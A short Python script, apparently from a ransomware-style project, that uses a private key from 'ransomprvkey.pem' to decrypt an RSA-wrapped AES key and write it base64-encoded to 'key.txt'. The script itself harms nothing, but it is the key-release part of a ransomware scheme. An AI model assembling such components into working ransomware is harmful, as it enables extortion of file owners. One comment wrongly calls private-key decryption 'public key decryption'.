from Crypto.PublicKey import RSA
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP

#create key.txt file

file_in = open("key.bin", "rb") #open file where encrypted key is
private_key = RSA.import_key(open("ransomprvkey.pem").read()) #read private key from file
enc_data = file_in.read(private_key.size_in_bytes())
cipher_rsa = PKCS1_OAEP.new(private_key)
key = cipher_rsa.decrypt(enc_data) #decrypt key using public key decryption
file_in.close()

file_out = open("key.txt", "wb+") #create new text file to store key used to encrypt files
data = b64encode(key) #encode key using base 64 encoding
file_out.write(data)
file_out.close()



